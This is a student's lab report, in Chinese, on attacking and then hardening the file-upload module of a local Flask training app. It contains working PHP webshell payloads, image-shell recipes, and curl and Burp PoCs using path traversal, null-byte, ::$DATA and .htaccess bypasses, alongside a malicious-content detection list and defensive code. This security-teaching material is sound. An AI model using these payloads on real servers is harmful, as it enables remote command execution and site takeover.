# 文件上传漏洞挖掘与攻防实战实训报告

---

## 一、基础信息

| 项目 | 内容 |
|------|------|
| **实训项目** | 文件上传漏洞挖掘与分层防御实战 |
| **实训学员** | 大二网络安全专业学生 |
| **实训日期** | 2026-07-21 |
| **实训环境** | Kali Linux 2026.2 / Python Flask + SQLite / Burp Suite |
| **靶机地址** | 192.168.126.133:5000 |
| **项目位置** | /opt/Class01/ |
| **项目背景** | 连续三天迭代的Flask用户管理系统，已完成SQL注入/WAF绕过全套防御 |
| **今日新增** | /upload头像上传模块（原始代码零校验，有大量高危漏洞） |
| **核心文件** | app.py / templates/upload.html / static/uploads/ |

---

## 二、实验目的

1. 理解文件上传漏洞的常见攻击手法：路径穿越、00截断、图片马、双后缀绕过
2. 掌握黑名单与白名单两种后缀校验方式的本质差异（白名单优于黑名单）
3. 实操Windows系统特性绕过：尾部空格/点号、`::$DATA`备用数据流
4. 学习魔数校验原理：通过文件头部二进制特征验证真实文件类型
5. 理解纵深防御体系：文件名清洗 → 后缀白名单 → 魔数校验 → 内容扫描 → 限流 → 日志
6. 对比文件上传漏洞与SQL注入的危害差异，建立更全面的漏洞认知

---

## 三、今日实训三阶段工作概述

### 第一阶段：业务开发 + 漏洞审计（09:00-10:30）

上午先快速开发了 `/upload` 头像上传模块，功能仅需实现：
- 登录用户上传文件
- 保存到 `static/uploads/` 目录
- 返回文件URL并显示预览

原始代码仅 15 行，没有任何安全校验：

```python
# app.py v1.0 — 原始上传代码（零防护）
@app.route("/upload", methods=["GET", "POST"])
def upload():
    username = session.get("username")
    if not username or username not in USERS:
        return redirect("/login")
    if request.method == "POST":
        file = request.files.get("file")
        filename = file.filename                    # 直接取原始文件名
        filepath = os.path.join(upload_dir, filename)
        file.save(filepath)                          # 直接保存，不做任何检查
        file_url = url_for("static", filename=f"uploads/{filename}")
        return render_template("upload.html", success=True, ...)
```

### 第二阶段：Burp渗透测试（10:30-12:00）

使用 Burp Suite 对上传接口进行手工渗透，验证以下攻击向量全部成功：

**Burp抓包原始请求（上传正常图片）：**
```
POST /upload HTTP/1.1
Host: 192.168.126.133:5000
Cookie: session=...
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="avatar.png"
Content-Type: image/png

[PNG二进制数据]
------WebKitFormBoundary--
```

**攻击验证1 — 直接上传WebShell：**
```
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/png

<?php system($_GET['cmd']); ?>
```
→ 上传成功，返回 `/static/uploads/shell.php`，浏览器访问可直接执行命令。

**攻击验证2 — 路径穿越 + 覆盖文件：**
```
Content-Disposition: form-data; name="file"; filename="../templates/index.html"
```
→ 上传成功，文件被写入 templates/ 目录，覆盖首页模板。

**攻击验证3 — 图片马（GIF头+PHP代码）：**
```
Content-Disposition: form-data; name="file"; filename="gifshell.php"
Content-Type: image/gif

GIF89a<?php phpinfo(); ?>
```
→ 上传成功，GIF89a 头部绕过魔数校验（当时还未实现魔数校验）。

全部攻击验证通过后，确认该上传接口存在 10+ 个高危漏洞。

### 第三阶段：分层加固改造 + 全用例复测（14:00-17:30）

分两轮加固：

| 轮次 | 改造重点 | 新增防御 |
|------|----------|----------|
| **第1轮** | 路径穿越+后缀白名单+UUID重命名 | `sanitize_filename()` / `ALLOWED_EXTENSIONS` / `uuid.uuid4().hex` |
| **第2轮** | 魔数校验+恶意扫描+限流+日志+安全头 | `validate_magic()` / `scan_malicious_content()` / `check_rate_limit()` / `@after_request` |

每轮改造后立即用第一阶段的全部Payload重新测试，确保旧攻击方式不再生效。

---

## 四、漏洞汇总表格

| 编号 | 漏洞类型 | 风险等级 | 攻击入口 | 修复状态 |
|------|----------|----------|----------|----------|
| VUL-U01 | 路径穿越（../） | **高危** | 文件名参数 | ✅ 已修复 |
| VUL-U02 | 路径穿越（/ 绝对路径） | **高危** | 文件名参数 | ✅ 已修复 |
| VUL-U03 | 00截断（%00） | **高危** | 文件名参数 | ✅ 已修复 |
| VUL-U04 | 无后缀白名单 → 任意文件上传 | **高危** | 文件扩展名 | ✅ 已修复 |
| VUL-U05 | 后缀大小写绕过（.PHP） | **高危** | 文件扩展名 | ✅ 已修复 |
| VUL-U06 | Windows尾部空格/点号绕过 | **中危** | 文件名参数 | ✅ 已修复 |
| VUL-U07 | `::$DATA`备用数据流绕过 | **中危** | 文件名参数 | ✅ 已修复 |
| VUL-U08 | `.htaccess`配置文件上传 | **高危** | 文件名参数 | ✅ 已修复 |
| VUL-U09 | 双后缀畸形（shell.jpg.php） | **高危** | 文件扩展名 | ✅ 已修复 |
| VUL-U10 | 图片马（伪造头部+恶意代码） | **高危** | 文件内容 | ✅ 已修复 |
| VUL-U11 | WebShell（PHP/脚本直接上传） | **高危** | 文件内容 | ✅ 已修复 |
| VUL-U12 | Content-Type伪造 | **中危** | Content-Type头 | ✅ 已修复 |
| VUL-U13 | 原始文件名未做UUID重命名 | **中危** | 文件存储 | ✅ 已修复 |
| VUL-U14 | 无上传限流 → 批量Fuzz | **中危** | POST频次 | ✅ 已修复 |
| VUL-U15 | 无上传日志 → 攻击溯源困难 | **低危** | 审计 | ✅ 已修复 |
| VUL-U16 | 无安全响应头 → XSS执行 | **中危** | 静态文件响应 | ✅ 已修复 |
| VUL-U17 | 无异常捕获 → 500信息泄露 | **低危** | 异常处理 | ✅ 已修复 |

---

## 五、分项漏洞原理 + POC复现 + 分层修复代码方案

### 5.1 VUL-U01~U03 路径穿越 + 00截断

#### 漏洞原理

原始代码直接使用 `file.filename` 拼接路径：

```python
# 原始代码
filename = file.filename
filepath = os.path.join(upload_dir, filename)
file.save(filepath)
```

攻击者传入 `../../etc/shell.php` 时，实际保存路径为：
```
/opt/Class01/static/uploads/../../etc/shell.php
```
简化后 → `/opt/Class01/etc/shell.php`，实现了任意目录写入。

`%00` 截断利用C语言字符串以NULL结尾的特性：`shell.php\x00.png` → 系统截取为 `shell.php`。

#### POC复现（Burp数据包）

```http
POST /upload HTTP/1.1
Host: 192.168.126.133:5000
Cookie: session=eyJ1c2VybmFtZSI6ImFkbWluIn0.Z7v9aQ

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="../../../tmp/shell.php"
Content-Type: image/png

<?php @eval($_POST['c']); ?>
------WebKitFormBoundary--
```

**curl命令：**
```bash
# 绝对路径穿越
curl -F "file=@shell.php;filename=/etc/passwd.php" -b cookies.txt \
  "http://192.168.126.133:5000/upload"

# 00截断
curl -F "file=@shell.php;filename=shell.php%00.png" -b cookies.txt \
  "http://192.168.126.133:5000/upload"
```

#### 分层修复方案

| 层级 | 修复措施 | 代码 | 位置 |
|------|----------|------|------|
| **底层根治** | 替换 `../` `/` `\\` `\x00` 为空 | `.replace("../","").replace("/","").replace("\\","").replace("\x00","")` | `sanitize_filename()` |
| **辅助检测** | 清洗前后比对，不一致则拒绝 | `if clean_name != original_name: return error` | upload() 第①步 |
| **底层根除** | UUID重命名，彻底消除路径拼接风险 | `uuid.uuid4().hex` + `.ext` | upload() 第⑦步 |

```python
# 最终修复代码
def sanitize_filename(filename):
    filename = filename.replace("../", "").replace("./", "")
    filename = filename.replace("/", "").replace("\\", "").replace("\x00", "")
    # ... 其余清洗
    return filename

# upload() 中：
clean_name = sanitize_filename(original_name)
if clean_name != original_name or clean_name == "":
    return render_template("upload.html", error="上传失败：文件名包含非法字符或路径穿越特征")
```

---

### 5.2 VUL-U04~U05 后缀白名单缺失 + 大小写绕过

#### 漏洞原理

原始代码 **根本没有检查文件扩展名**，任意后缀（`.php` `.asp` `.exe` ）均可上传。即使加了黑名单，攻击者通过 `.PHP` `.Php` `.pHP` 大小写变形即可绕过。

**黑名单缺陷的本质**：攻击者总能找到黑名单覆盖不到的绕过方式，而白名单只放行明确安全的类型。

#### POC复现

```bash
# 直接上传 PHP 文件
curl -F "file=@webshell.php;type=image/png" -b cookies.txt \
  "http://192.168.126.133:5000/upload"

# 大小写绕过（如果只有黑名单）
curl -F "file=@webshell.pHp;type=image/png" -b cookies.txt \
  "http://192.168.126.133:5000/upload"

# 访问上传的WebShell
curl "http://192.168.126.133:5000/static/uploads/webshell.php?cmd=id"
```

#### 分层修复方案

| 层级 | 修复措施 | 代码 |
|------|----------|------|
| **底层根除** | 白名单仅允许 `jpg/jpeg/png/gif` | `ALLOWED_EXTENSIONS = {"jpg","jpeg","png","gif"}` |
| **关键细节** | 后缀统一转小写 | `ext = clean_name.rsplit(".",1)[1].lower()` |
| **辅助防护** | 不在白名单一律拒绝 | `if ext not in ALLOWED_EXTENSIONS: return error` |

```python
ALLOWED_EXTENSIONS = {"jpg", "jpeg", "png", "gif"}

ext = clean_name.rsplit(".", 1)[1].lower()    # 转小写后判断
if ext not in ALLOWED_EXTENSIONS:              # 白名单校验
    return render_template("upload.html", error=f"不允许的文件类型 .{ext}")
```

---

### 5.3 VUL-U06~U07 Windows特性绕过（空格/点号/::$DATA）

#### 漏洞原理

Windows文件系统存在特性绕过：

| 攻击方式 | 上传文件名 | 实际保存文件名 | 绕过原理 |
|----------|-----------|---------------|----------|
| 尾部空格 | `shell.php ` | `shell.php` | Windows自动去除末尾空格 |
| 尾部点号 | `shell.php.` | `shell.php` | Windows自动去除末尾点号 |
| 连续点号 | `shell..png` | 可能被系统截断 | 某些系统将 `..` 解释为上层目录 |
| `::$DATA`流 | `test.php::$DATA` | `test.php` | NTFS备用数据流特性，`::$DATA`之后的内容被忽略 |

#### POC复现

```bash
# 空格绕过
curl -F "file=@shell.php;filename=shell.php " -b cookies.txt \
  "http://192.168.126.133:5000/upload"

# 点号绕过
curl -F "file=@shell.php;filename=shell.php." -b cookies.txt \
  "http://192.168.126.133:5000/upload"

# ::$DATA 流
curl -F "file=@shell.php;filename=test.php::$DATA" -b cookies.txt \
  "http://192.168.126.133:5000/upload"
```

#### 修复方案

```python
# 在 sanitize_filename() 中新增
filename = filename.rstrip(" .")               # 清洗末尾空格和点号
while ".." in filename:
    filename = filename.replace("..", ".")      # 折叠连续点号
if "::$DATA" in filename.upper():              # 检测备用数据流
    filename = ""
```

---

### 5.4 VUL-U08 `.htaccess` 配置文件上传

#### 漏洞原理

Apache/PHP环境中，上传 `.htaccess` 文件可以修改目录配置，使图片文件被解析为PHP：

```apache
# .htaccess 内容
AddType application/x-httpd-php .png
```

上传此文件后，目录下所有 `.png` 文件都会被当作PHP执行，配合图片马上传即可 getshell。

#### POC

```
Content-Disposition: form-data; name="file"; filename=".htaccess"
Content-Type: text/plain

AddType application/x-httpd-php .png
```

#### 修复方案

```python
# sanitize_filename() 中
if filename.lower() == ".htaccess" or filename.lower().startswith(".htaccess"):
    filename = ""
```

---

### 5.5 VUL-U09 双后缀畸形绕过

#### 漏洞原理

某些系统只检查最后一个后缀，攻击者构造 `shell.jpg.php` 等双后缀文件：
- 系统看到 `.php` → 拒绝上传（如果白名单有效）
- 但如果有中间件解析漏洞（如Apache对 `shell.php.jpg` 的解析行为）

更危险的场景是 **双后缀应用在黑名单系统中**：黑名单只阻止 `.php`，`shell.jpg.php` 的后缀是 `.php` 仍然被拦截。但 `shell.php.jpg` 后缀是 `.jpg` 逃过黑名单，而 Apache 旧版本可能优先识别 `.php`。

#### POC

```bash
# 双后缀绕过（针对黑名单系统）
curl -F "file=@shell.php.jpg;filename=shell.php.jpg" -b cookies.txt \
  "http://192.168.126.133:5000/upload"
```

#### 修复方案

```python
parts = clean_name.lower().split(".")
if len(parts) > 2:
    suspicious_exts = {"php", "php3", "php4", "phtml", "asp", "aspx",
                       "jsp", "exe", "sh", "py", "pl", "cgi", "htaccess", "shtml"}
    for p in parts[:-1]:                    # 检查除最后一个分段外的所有部分
        if p in suspicious_exts or p in ALLOWED_EXTENSIONS:
            return render_template("upload.html", error="禁止上传双后缀文件")
```

---

### 5.6 VUL-U10~U11 图片马 + WebShell直接上传

#### 漏洞原理

图片马（Image Shell）是最经典的文件上传绕过技术：在图片文件头部二进制签名（GIF89a/PNG/JFIF）后拼接PHP代码，许多服务器端只检查文件头几个字节就判定为合法图片。

**图片马制作：**
```bash
# Linux 一行命令制作图片马
echo "GIF89a<?php @eval($_POST['c']);?>" > shell.gif.php

# 或者用copy命令（Windows）
copy /b avatar.png + shell.php webshell.png
```

#### POC复现

```bash
# 制作图片马
echo 'GIF89a<?php phpinfo();?>' > gifshell.php
echo -e '\x89PNG\r\n\x1A\n<?php @eval($_POST["c"]);?>' > pngshell.php

# 上传图片马
curl -F "file=@gifshell.php;type=image/gif" -b cookies.txt \
  "http://192.168.126.133:5000/upload"

# 上传后访问触发
curl "http://192.168.126.133:5000/static/uploads/gifshell.php"
```

**WebShell直接上传**更直接，不需要伪装：

```bash
echo '<?php system($_GET["cmd"]);?>' > cmd.php
curl -F "file=@cmd.php;type=image/png" -b cookies.txt \
  "http://192.168.126.133:5000/upload"
```

#### 分层修复方案

| 层级 | 修复措施 | 代码 | 位置 |
|------|----------|------|------|
| **底层 - 魔数校验** | 读取文件前8字节比对JPEG/PNG/GIF签名 | `validate_magic()` → `MAGIC_NUMBERS` | L620-634 |
| **底层 - 内容扫描** | 17种恶意特征全量匹配 | `scan_malicious_content()` → `MALICIOUS_PATTERNS` | L553-571 |
| **辅助 - 白名单后缀** | 只允许jpg/jpeg/png/gif | `ALLOWED_EXTENSIONS` | upload() 第③步 |

```python
# 魔数校验 — 读取文件头部二进制特征
MAGIC_NUMBERS = {
    b"\xFF\xD8\xFF":           "jpg/jpeg",   # JPEG 头部: FF D8 FF
    b"\x89PNG\r\n\x1A\n":     "png",         # PNG 头部: 89 50 4E 47 ...
    b"GIF87a":                 "gif",         # GIF87a 头部
    b"GIF89a":                 "gif",         # GIF89a 头部
}

def validate_magic(fileobj):
    header = fileobj.read(8)
    fileobj.seek(0)
    for magic, _ in MAGIC_NUMBERS.items():
        if header.startswith(magic):
            return True
    return False

# 恶意特征扫描 — 17种模式
MALICIOUS_PATTERNS = [
    b"<?php", b"<?=",                    # PHP代码/短标签
    b"<script", b"javascript:",          # XSS
    b"eval(", b"system(", b"exec(",      # 危险函数
    b"base64_decode(", b"passthru(",     # 编码/执行
    b"shell_exec(", b"<?xml",            # 命令执行/XXE
    b"<!ENTITY", b"<%@",                 # XXE/ASP
    b"Content-Type:",                    # 邮件头注入
]
```

测试验证魔数校验 + 内容扫描的拦截效果：

| 攻击类型 | Payload | 拦截结果 | 拦截层 |
|----------|---------|----------|--------|
| 纯文本伪装 | `hello world` 存为 `.png` | ✅ 魔数拦截 | validate_magic() |
| PNG图片马 | `PNG头 + <?php eval();?>` | ✅ 内容扫描拦截 | scan_malicious_content() |
| GIF图片马 | `GIF89a + <?=phpinfo()?>` | ✅ 内容扫描拦截 | scan_malicious_content() |
| 正常PNG | 真实PNG文件 | ✅ 放行 | — |

---

### 5.7 VUL-U12~U17 配套防御逐步补齐

| 漏洞 | 问题 | 修复代码 | 行号 |
|------|------|----------|------|
| Content-Type伪造 | 未校验请求MIME | `if content_type and not content_type.startswith("image/"): return error` | L697-699 |
| UUID重命名 | 原始文件名可能重复/恶意 | `uuid.uuid4().hex + "." + ext` | L701-702 |
| IP限流 | 批量Fuzz上传 | `check_rate_limit(ip)` 每分钟最多5次 | L523-532 / L650-653 |
| 上传日志 | 攻击溯源无依据 | `log_upload(username, ip, orig, save)` 写入logs/upload.log | L546-550 / L705 |
| 安全响应头 | 浏览器可能执行HTML | `X-Content-Type-Options: nosniff` | L574-579 |
| 异常捕获 | 500错误暴露路径 | `try-except Exception as e: return "上传失败：{e}"` | L645-713 |
| 16MB限制 | 大文件DoS | `app.config['MAX_CONTENT_LENGTH'] = 16MB` | L16 |

---

## 六、实训踩坑故障记录

### 坑1：Flask test_client 不自动设置文件的 Content-Type

**现象：** 用 `(io.BytesIO(b"x"), "test.png")` 二元组构造测试文件时，`file.content_type` 返回空字符串，导致 Content-Type 校验误拦截了正常测试。

**排查：** 打印 `file.content_type` 发现为空，查阅文档发现 Flask 的 FileStorage 在未显式指定 MIME 时不会自动推断。

**解决：** 改用三元组 `(io.BytesIO(b"x"), "test.png", "image/png")` 显式声明，同时修改后端逻辑：Content-Type 为空时不拦截，仅在明确设置且非 `image/` 前缀时才拒绝。

---

### 坑2：魔数校验后文件指针偏移导致后续文件保存为空

**现象：** 魔数校验时用 `fileobj.read(8)` 读取了前8字节，但没有恢复指针，后续 `file.save()` 保存了空文件（从偏移8开始读）。

**排查：** 上传的图片预览为空，检查 `static/uploads/` 发现文件只有丢弃的前8字节后的内容。

**解决：** 魔数校验函数末尾添加 `fileobj.seek(0)` 恢复指针：
```python
def validate_magic(fileobj):
    header = fileobj.read(8)
    fileobj.seek(0)          # ← 必须恢复指针！
    # ... 比对魔数
```

---

### 坑3：限流计数器在单次测试中不重置

**现象：** 测试第6次上传时返回限流提示，但后续测试要写 `_rate_store.clear()` 手动清空，否则所有后续请求都被限流。

**解决：** 在测试脚本中分组测试，每组之间 `from app import _rate_store; _rate_store.clear()`。生产环境限流是期望行为，测试时需要手动管理。

---

### 坑4：双后缀检测误伤合法文件

**现象：** `split(".")` 后检查中间段时，`my.profile.png` 也被拦截了，因为 `profile` 不在白名单但触发了长度>2的判断。

**解决：** 双后缀检测只针对中间段是**已知可执行后缀**或**已知图片后缀**才拦截。`profile` 既不是可执行后缀也不是图片后缀，应放行。

---

## 七、修复前后安全对比表格

| 对比维度 | 修复前（v1.0） | 修复后（v5.0） |
|----------|---------------|---------------|
| **文件名处理** | 直接使用原始文件名 | `sanitize_filename()` 清洗 + UUID重命名 |
| **后缀校验** | 无 | 白名单 `jpg/jpeg/png/gif` + 转小写 |
| **路径穿越防御** | 无 | 替换 `../` `/` `\\` `\x00` + 清洗前后比对 |
| **Windows特性** | 无 | `rstrip(" .")` + `::$DATA`检测 + 连续点号折叠 |
| **配置文件** | 无 | `.htaccess` 全小写比对拦截 |
| **双后缀** | 无 | `split(".")中间段检查` |
| **魔数校验** | 无 | JPEG/PNG/GIF 头部二进制签名验证 |
| **恶意内容扫描** | 无 | 17种特征匹配（PHP/脚本/命令执行/XXE） |
| **Content-Type** | 无 | 非空且非image/前缀拒绝 |
| **IP限流** | 无 | 每分钟最多5次上传 |
| **上传日志** | 无 | USER+IP+ORIG+SAVE 写入日志文件 |
| **安全响应头** | 无 | `X-Content-Type-Options: nosniff` |
| **异常处理** | 无 | `try-except` 中文提示 |
| **文件大小限制** | 无 | `MAX_CONTENT_LENGTH = 16MB` |
| **UUID重命名** | 无 | `uuid.uuid4().hex.ext` |

---

## 八、标准化复测测试用例

### 8.1 正常业务流程（确认不改坏）

| 编号 | 操作 | 预期结果 |
|------|------|----------|
| TC-U01 | 登录后上传真实PNG图片 | 成功，UUID文件名，可预览 |
| TC-U02 | 上传真实JPG图片 | 成功 |
| TC-U03 | 上传真实GIF图片 | 成功 |
| TC-U04 | 未登录访问/upload | 302跳转到/login |
| TC-U05 | 空文件提交 | 提示"请选择要上传的文件" |

### 8.2 路径穿越 + 00截断

| 编号 | Payload | 预期结果 |
|------|---------|----------|
| TC-U06 | `../../../etc/shell.php` | 拦截：非法路径字符 |
| TC-U07 | `/etc/passwd.php` | 拦截：非法路径字符 |
| TC-U08 | `..\\..\\shell.php` | 拦截：非法路径字符 |
| TC-U09 | `shell.php\x00.png` | 拦截：非法路径字符 |

### 8.3 后缀白名单 + 大小写

| 编号 | Payload | 预期结果 |
|------|---------|----------|
| TC-U10 | `test.php` | 拦截：不允许的文件类型 |
| TC-U11 | `test.asp` | 拦截 |
| TC-U12 | `test.jsp` | 拦截 |
| TC-U13 | `test.exe` | 拦截 |
| TC-U14 | `test.pHp` | 拦截（转小写后匹配） |
| TC-U15 | `test.PHP` | 拦截 |
| TC-U16 | `test.pNg` | 允许（转小写后匹配白名单） |

### 8.4 Windows特性绕过

| 编号 | Payload | 预期结果 |
|------|---------|----------|
| TC-U17 | `shell.php `（尾部空格）| 拦截：非法字符 |
| TC-U18 | `shell.php.`（尾部点号）| 拦截：非法字符 |
| TC-U19 | `shell..png`（连续点号）| 拦截：非法字符（或魔数不匹配）|
| TC-U20 | `test.php::$DATA` | 拦截：非法字符 |

### 8.5 配置文件 + 双后缀

| 编号 | Payload | 预期结果 |
|------|---------|----------|
| TC-U21 | `.htaccess` | 拦截：非法字符 |
| TC-U22 | `.HtAccess`（大小写） | 拦截 |
| TC-U23 | `shell.jpg.php` | 拦截：不允许的文件类型 |
| TC-U24 | `a.png.php3` | 拦截：不允许的文件类型 |

### 8.6 图片马 + WebShell + 恶意内容

| 编号 | Payload | 预期结果 |
|------|---------|----------|
| TC-U25 | `GIF89a<?php phpinfo();?>` 存为`.png` | 魔数通过但内容扫描拦截 |
| TC-U26 | `<script>alert(1)</script>` 伪装`.png` | 魔数未通过或内容扫描拦截 |
| TC-U27 | `<?php @eval($_POST['c']);?>` 伪装`.png` | 同上 |
| TC-U28 | `eval(base64_decode($_GET['x']))` 伪装`.png` | 魔数未通过 |
| TC-U29 | 真实PNG + 尾部附加 `<?php phpinfo();?>` | 魔数通过 + 内容扫描拦截 |
| TC-U30 | 纯文本文件改后缀 `.png` | 魔数校验拦截 |

### 8.7 配套防御

| 编号 | 操作 | 预期结果 |
|------|------|----------|
| TC-U31 | Content-Type 设 `text/html` | 拦截：非图片类型 |
| TC-U32 | 连续6次上传（同一IP） | 第6次限流拦截 |
| TC-U33 | 上传 >16MB 文件 | Flask返回413 |
| TC-U34 | 访问上传后的文件URL | 响应头含 `X-Content-Type-Options: nosniff` |

---

## 九、实验总结与心得体会

### 9.1 理论与实操的差距 — 比SQL注入更"实在"的漏洞

连续三天的实训（SQL注入 → WAF绕过 → 文件上传），我的感受是 **文件上传漏洞的危害比SQL注入更直接**。

SQL注入需要构造闭合、猜测列数、绕过WAF、逐字盲注，虽然有危害但利用门槛较高。而文件上传漏洞：

```
打开Burp → 改个文件名 → 点上传 → getshell
```

路径就是这么短。课堂上老师演示上传WebShell到getshell全程不到30秒，比SQL注入快了一个数量级。亲手在Burp里改包上传 `.php` 文件成功返回URL的那一刻，我真实地感受到了这个漏洞的"暴力"。

### 9.2 白名单 > 黑名单 — 一个被实践验证的原则

课堂上学"白名单优于黑名单"时觉得抽象，但这次实训被完全验证。

黑名单思路：阻止 `.php` `.asp` `.jsp` → 攻击者用 `.pHp` `.PHP5` `.shtml` `.htaccess` ··· 总有一个绕得过。

白名单思路：只允许 `.jpg` `.jpeg` `.png` `.gif` → 不在列表里的一律拒绝，没有绕过空间。

黑名单需要**穷举所有可能的恶意后缀**，这在理论上就不可能完成。白名单只需要**枚举安全的类型**，简单直接。

### 9.3 纵深防御不是概念，是分层保命

如果只有后缀白名单，攻击者可以：
- 上传 `.htaccess` 修改目录配置 → 让服务器把 `.png` 当PHP执行
- 上传图片马（GIF头+PHP代码）→ 后缀是 `.gif` 白名单放行

如果只有魔数校验，攻击者可以：
- 在真实图片尾部拼接WebShell代码 → 魔数通过但内容危险

只有 `后缀白名单 + 魔数校验 + 恶意内容扫描 + UUID重命名` 全上，才能覆盖攻击链路的所有环节。

```
文件名清洗 → 后缀白名单 → 双后缀检测 → 魔数校验 → 内容扫描 → Content-Type → UUID存储 → 限流 → 日志
```

任何单层都能被绕过，但全部串联后绕过成本远高于攻击收益。

### 9.4 三天实训的完整脉络

| 天数 | 主题 | 核心知识点 | 最大收获 |
|------|------|-----------|---------|
| Day1 | SQL手工注入 | 字符型联合查询、布尔盲注、7步探测 | 参数化查询是注入的底牌 |
| Day2 | WAF绕过防御 | 换行/注释/关键字变形绕过、双层编码 | 没有WAF是100%安全的 |
| Day3 | 文件上传攻防 | 路径穿越、图片马、魔数校验、白名单 | 文件上传的危害比注入更直接 |

这三天的学习让我认识到：**Web安全不是学几个漏洞利用手法就够了，而是建立一套攻击者视角的思维模式**。每写一行代码都要想"这个参数能被怎么利用"，每个功能上线前都要过一遍常见攻击手法。

---

## 十、生产环境拓展优化建议

### 10.1 图片二次压缩（杜绝图片马）

```python
# 上传后重新编码图片，图片马的恶意代码在重编码中被自动丢弃
from PIL import Image

img = Image.open(filepath)
img.save(filepath, "PNG")  # 重新编码，丢弃所有冗余数据
```

任何附加在图片尾部的代码在重编码后都会丢失。

### 10.2 独立文件服务器

```python
# 生产环境不要将上传目录与应用目录混在一起
# 推荐：使用阿里云OSS / AWS S3 等对象存储
import boto3
s3 = boto3.client("s3")
s3.upload_fileobj(file, "my-bucket", f"avatars/{uuid_filename}")
```

静态文件服务器和应用服务器分离，即使上传了恶意文件也无法执行。

### 10.3 限流升级为Redis

```python
# 当前：内存 defaultdict（重启后清零）
# 生产：Redis 计数器（持久化 + 分布式）
import redis
r = redis.Redis()
key = f"upload_rate:{ip}"
if r.incr(key) > 5:
    return "限流"
r.expire(key, 60)
```

### 10.4 病毒扫描

```python
# 上传完成后调用 ClamAV 扫描
import subprocess
result = subprocess.run(["clamscan", filepath], capture_output=True)
if "Infected" in result.stdout:
    os.remove(filepath)
    return "文件包含病毒"
```

### 10.5 日志接入SIEM

```python
# 上传日志应接入集中式日志系统（ELK / Splunk）
# 当前：本地文件 logs/upload.log
# 生产：通过 syslog / HTTP 发送到安全运营中心
```

### 10.6 完整的配置建议汇总

```python
# app.py 生产配置
app.config['MAX_CONTENT_LENGTH'] = 2 * 1024 * 1024          # 2MB（头像足够）
app.config['SESSION_COOKIE_SECURE'] = True                   # HTTPS Only
app.config['SESSION_COOKIE_HTTPONLY'] = True                 # 禁止JS读取
app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'                # CSRF防护

# Nginx 层防护
# location /static/uploads/ {
#     valid_referers none blocked ~.example.com;
#     if ($invalid_referer) { return 403; }        # 防盗链
#     add_header X-Content-Type-Options nosniff;    # 禁止MIME嗅探
#     add_header Content-Disposition 'attachment';  # 强制下载不执行
# }
```

---

## 附录A：完整上传防御流水线（12步）

```
客户端请求上传
  ↓
  ① IP限流 (check_rate_limit)              ← 每分钟最多5次
  ↓
  ② 文件名清洗 (sanitize_filename)          ← ../ / \ %00 空格 . ::$DATA .htaccess
  ↓
  ③ 清洗前后对比 → 不一致则拒绝
  ↓
  ④ 提取后缀 → 转小写
  ↓
  ⑤ 白名单校验 (ALLOWED_EXTENSIONS)         ← 仅 jpg/jpeg/png/gif
  ↓
  ⑥ 双后缀检测 (split检查中间段)
  ↓
  ⑦ 魔数校验 (validate_magic)               ← JPEG/PNG/GIF 头部二进制签名
  ↓
  ⑧ 恶意内容扫描 (scan_malicious_content)   ← 17种特征
  ↓
  ⑨ Content-Type 校验
  ↓
  ⑩ UUID 重命名存储
  ↓
  ⑪ 记录上传日志
  ↓
  ⑫ try-except 异常捕获 → 中文提示
  ↓
  响应: X-Content-Type-Options: nosniff
```

## 附录B：攻击方式与防御措施速查

| 攻击手法 | 防御方案 | 代码函数 | 行号 |
|----------|----------|----------|------|
| 路径穿越 `../` | 替换 + 对比 | `sanitize_filename()` | L603 |
| 00截断 `%00` | 替换 `\x00` | `sanitize_filename()` | L605 |
| 后缀大小写 `.PHP` | `ext.lower()` | upload() 第②步 | L665 |
| 尾部空格 `shell.php ` | `rstrip(" .")` | `sanitize_filename()` | L607 |
| 备用流 `::$DATA` | 全大写检测后清空 | `sanitize_filename()` | L611-613 |
| `.htaccess` | 全小写比对后清空 | `sanitize_filename()` | L614-616 |
| 双后缀 `shell.jpg.php` | 中间段可执行后缀检测 | upload() 第④步 | L671-681 |
| 图片马 | 魔数校验 + 内容扫描 | `validate_magic()` + `scan_malicious_content()` | L620-634 / L553-571 |
| WebShell | 恶意特征匹配 | `MALICIOUS_PATTERNS` 17种 | L553-571 |
| 批量Fuzz | IP限流 | `check_rate_limit()` | L523-532 |
| 路径覆盖 | UUID重命名 | `uuid.uuid4().hex` | L701-702 |

---

*报告人：大二网络安全实训生*
*日期：2026年7月21日*
